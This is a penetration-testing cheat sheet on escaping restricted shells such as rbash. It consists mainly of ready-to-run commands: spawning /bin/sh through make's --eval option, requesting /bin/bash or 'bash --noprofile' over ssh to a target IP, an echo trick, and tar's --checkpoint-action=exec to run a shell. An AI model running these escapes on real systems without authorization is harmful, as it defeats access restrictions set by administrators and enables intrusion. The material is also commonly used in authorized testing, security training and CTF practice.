---
id: 4f5f107e-4315-4262-a219-a85d390b257a
name: Restricted Shell Escapes
type: cheatsheet
verified: true
created_at: '2019-09-19T17:03:16.339407+00:00'
updated_at: '2023-05-30T20:10:30.391820+00:00'
---

# Restricted Shell Escapes

**Status**: ✓ Verified

# Description

A collection of commands and techniques which attempt to escape restricted shell environment. Identifying the shell is and finding which programs can be run may lead to an escape, be it via interactive shell or read/write capabilities.  Many of these are Lay of the Land Binaries, meaning these tools are installed by default on most systems.









**Command** ([[rbash Escape using make to launch bash]]):

```bash
COMMAND='/bin/sh'
make -s --eval=$'x:\n\t-'"$COMMAND"
```





When SSH'ing into a system, it may be possible to specify the Bash shell, bypassing restrictions.





**Command** ([[ssh specifying shell]]):

```bash
ssh $_USER@$_TARGET_IP -t "/bin/bash"
```



This is similar to the previous command, and may succeed if it failed.





**Command** ([[ssh specifying shell and no profile]]):

```bash
ssh $_USER@$_TARGET_IP -t "bash --noprofile"
```





Certain versions of rbash can be escaped with echo





**Command** ([[echo Bypass restricted shell]]):

```bash
echo && 'bash'
```





When tar is executable, a script can be placed and run





**Command** ([[tar Bypass restricted shell checkpoint]]):

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```



## 


